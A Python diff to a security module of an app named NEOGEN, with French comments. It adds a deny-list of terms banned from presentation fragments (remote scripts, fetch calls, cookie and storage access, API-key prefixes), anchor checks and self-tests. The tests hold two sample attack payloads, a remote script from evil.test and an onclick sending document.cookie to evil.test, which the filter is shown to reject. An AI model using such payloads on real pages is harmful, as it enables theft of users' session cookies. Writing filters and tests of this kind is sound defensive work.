@@ -86,6 +86,56 @@ TYPES_SYSTEME = {"fonction", "capacite", "section", "agent", "savoir", "modele",
 TYPES_FORGEABLES = TYPES_PERSO | TYPES_SYSTEME
 
 # ---------------------------------------------------------------------------
+# CHARTE DU PROPRIETAIRE : ce qui reste intouchable MEME pour Jordan (proprio).
+#
+# Le proprietaire a TOUS les pouvoirs sur la PRESENTATION et les fonctionnalites
+# visibles de NEOGEN (forge d'interface, fragments, patch ui.py). Mais 4 piliers
+# garantissent qu'il ne peut JAMAIS casser ce qui fait que NEOGEN fonctionne, est
+# sur, et reste fidele a lui-meme. C'est volontaire : se proteger de sa propre
+# erreur (un patch genere par LLM qui casserait tout, un fragment qui exfiltre).
+# ---------------------------------------------------------------------------
+INVARIANTS_PROPRIO = {
+    "integrite_securite": (
+        "La securite et son integrite : auth, isolation/sandbox, murs, gardiens. "
+        "Aucun changement de presentation ne peut les desactiver ou les contourner."
+    ),
+    "fonctions_vitales": (
+        "Les fonctions qui permettent le bon fonctionnement : le moteur (api, gateway, "
+        "orchestrateur, generator, membrane, executeur). Le code vital reste grave."
+    ),
+    "vision": (
+        "La vision de l'application : la mission (l'ADN). Ce que NEOGEN EST ne se "
+        "reecrit pas par un changement d'apparence."
+    ),
+    "morale": (
+        "La morale : les principes inviolables (humain dernier mot, transparence, "
+        "securite graduee). L'ethique du systeme ne se negocie pas."
+    ),
+}
+
+# Marqueurs HTML/JS qui DOIVENT rester presents dans la page rendue : si une
+# modification de presentation (fragment ou patch ui.py) les fait disparaitre, on
+# refuse (fail-closed). Ce sont les ancres d'integrite de l'interface.
+ANCRES_INTEGRITE = (
+    'src="/static/app.js"',   # le moteur JS de l'UI (sans lui, rien ne fonctionne)
+    'id="sidebar"',           # la navigation principale (sans elle, plus d'acces aux sections)
+)
+
+# Termes interdits dans tout contenu de PRESENTATION (HTML/CSS/JS de fragment).
+# Defense contre l'exfiltration, le reseau externe et l'injection — vaut surtout
+# pour la version PUBLIQUE ou un fragment forge est servi a tous les visiteurs.
+_TERMES_PRESENTATION_INTERDITS = (
+    "<script src", "<script\tsrc", "import(", "eval(", "function(",
+    "fetch(\"http", "fetch('http", "fetch(`http", "xmlhttprequest",
+    "document.cookie", "localstorage", "sessionstorage", "indexeddb",
+    "window.location =", "window.location=", "location.href =", "location.replace",
+    "@import", "url(http", "url('http", 'url("http', "url(//", "javascript:",
+    "onerror=", "onload=", "expression(", "behavior:", "-moz-binding",
+    "atob(", "btoa(", "new image", "navigator.sendbeacon", "websocket",
+    "credentials", "api_key", "sk-ant", "shpat_", "owner_unlimited", "neogen_owner",
+)
+
+# ---------------------------------------------------------------------------
 # Privileges : qui peut quoi.
 # ---------------------------------------------------------------------------
 
@@ -160,6 +210,30 @@ def autoriser(changement: dict) -> tuple[bool, str]:
     return True, "ok"
 
 
+def presentation_sure(contenu: str) -> tuple[bool, str]:
+    """Garde fail-closed pour un contenu de PRESENTATION (fragment HTML/CSS, patch ui).
+    Refuse tout acces reseau externe, script distant, exfiltration ou terme du noyau.
+    Le proprio a les pouvoirs sur l'apparence, JAMAIS sur l'integrite/securite (charte)."""
+    if not isinstance(contenu, str):
+        return False, "contenu de presentation invalide"
+    bas = contenu.lower()
+    for terme in _TERMES_PRESENTATION_INTERDITS:
+        if terme in bas:
+            return False, f"terme interdit en presentation : '{terme}' (charte proprio : integrite/securite)"
+    return True, "ok"
+
+
+def verifier_ancres(page_html: str) -> tuple[bool, str]:
+    """Verifie que les ancres d'integrite de l'interface restent presentes apres une
+    modification (fragment injecte ou patch ui.py). Si une ancre disparait -> refus."""
+    if not isinstance(page_html, str):
+        return False, "page invalide"
+    for ancre in ANCRES_INTEGRITE:
+        if ancre not in page_html:
+            return False, f"ancre d'integrite manquante : '{ancre}' (l'interface serait cassee)"
+    return True, "ok"
+
+
 def _aplatir_cles(obj, prefixe="") -> list[str]:
     """Liste recursive des cles d'un dict (pour detecter une cle de mur cachee)."""
     out = []
@@ -188,6 +262,7 @@ def resume() -> dict:
         "murs": list(MURS.keys()),
         "zones_protegees": sorted(ZONES_PROTEGEES),
         "types_forgeables": {"perso": sorted(TYPES_PERSO), "systeme": sorted(TYPES_SYSTEME)},
+        "charte_proprio": INVARIANTS_PROPRIO,
     }
 
 
@@ -246,6 +321,25 @@ if __name__ == "__main__":
     os.environ["NEOGEN_OWNER_UNLIMITED"] = _bak
     print("  portee : admin=complet, public/perso=local_bride, public/systeme=remonte -> OK")
 
+    # Charte proprio : presentation_sure refuse le reseau/script/exfiltration.
+    ok, r = presentation_sure("<div class='panel'><h3>Mon panel</h3><p>Texte</p></div>")
+    assert ok, r
+    print("  presentation_sure : fragment HTML propre -> OK")
+    ok, r = presentation_sure("<div><script src=\"http://evil.test/x.js\"></script></div>")
+    assert not ok and "interdit" in r, r
+    print("  presentation_sure : script distant REFUSE -> OK")
+    ok, r = presentation_sure("<div onclick=\"fetch('http://evil.test?c='+document.cookie)\">x</div>")
+    assert not ok, r
+    print("  presentation_sure : exfiltration cookie REFUSEE -> OK")
+
+    # Ancres d'integrite : une page sans le moteur JS est refusee.
+    ok, r = verifier_ancres('<body><nav id="sidebar"></nav><script src="/static/app.js"></script></body>')
+    assert ok, r
+    print("  verifier_ancres : page complete -> OK")
+    ok, r = verifier_ancres('<body><nav id="sidebar"></nav></body>')
+    assert not ok and "app.js" in r, r
+    print("  verifier_ancres : page sans moteur JS REFUSEE -> OK")
+
     print("=" * 64)
-    print("  TOUT VERT : le noyau est garde, fail-closed, data-driven.")
+    print("  TOUT VERT : le noyau est garde, fail-closed, data-driven + charte proprio.")
     print("=" * 64)
